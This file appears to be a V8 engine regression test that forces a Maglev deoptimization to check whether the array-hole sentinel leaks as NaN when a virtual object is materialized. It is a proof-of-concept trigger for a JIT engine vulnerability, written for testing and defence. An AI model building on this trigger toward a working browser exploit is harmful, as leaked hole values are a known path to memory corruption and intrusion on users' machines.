// Copyright 2024 the V8 project authors. All rights reserved.
// Use of this source code is governed by a BSD-style license that can be
// found in the LICENSE file.

// Flags: --allow-natives-syntax --maglev --no-turbofan

// Simple assert shim for running in bare d8
if (typeof assertEquals === 'undefined') {
  globalThis.assertEquals = function(expected, actual, msg) {
    if (expected !== actual) {
      // Handle NaN equality
      if (typeof expected === 'number' && isNaN(expected) && typeof actual === 'number' && isNaN(actual)) return;
      throw new Error(`Assertion failed: expected ${expected}, got ${actual}. ${msg || ''}`);
    }
  };
}

// Setup: Create an array with a hole (HoleyFloat64).
// V8 represents the hole as a specific quiet NaN (kHoleNanInt64).
const holeyArray = [1.1, 2.2, , 4.4];

function trigger(arr, index, forceDeopt) {
  // Load the value.
  // Maglev compiles this load. Since the array is holey double (feedback tracked),
  // 'val' is tracked as a HoleyFloat64.
  const val = arr[index];

  // Virtual Object Allocation (Allocation Elimination).
  // We create a temporary object. Maglev sees it doesn't escape
  // (until the deopt point), so it optimizes it away.
  // It records 'val' as a field of this virtual object in the
  // translation frame.
  const wrapper = { value: val };

  // Deoptimization Trigger.
  if (forceDeopt) {
    // We force a deopt here. The Deoptimizer must now:
    // a. Reconstruct the stack frame.
    // b. Materialize the 'wrapper' object (because it conceptually exists).
    // c. To materialize 'wrapper', it calls GetValue() for 'wrapper.value'.
    %DeoptimizeNow();
  }

  return wrapper.value;
}

%PrepareFunctionForOptimization(trigger);

// Warmup Maglev WITH holes to ensure feedback allows HoleyFloat64.
// If we only warmup with doubles, Maglev will insert a CheckNotHole at the load,
// causing an eager deopt *before* we reach the DeoptimizeNow call.
for (let i = 0; i < 20000; i++) {
  trigger(holeyArray, i % 4, false);
}

%OptimizeMaglevOnNextCall(trigger);
trigger(holeyArray, 0, false);

// Trigger the leak.
// Index 2 is the hole.
// We expect the Deoptimizer to materialize 'wrapper'.
// 'wrapper.value' should be undefined (the hole).
// If vulnerable, 'wrapper.value' will be a HeapNumber(NaN) containing the hole pattern.
const result = trigger(holeyArray, 2, true);

// Verification
if (Number.isNaN(result)) {
  console.log("VULNERABILITY REPRODUCED: Leaked Hole sentinel as NaN!");
} else if (result === undefined) {
  console.log("Safe: Correctly converted to undefined.");
} else {
  console.log("Unexpected result: " + result);
}

assertEquals(undefined, result, "The hole should be materialized as undefined, not NaN.");
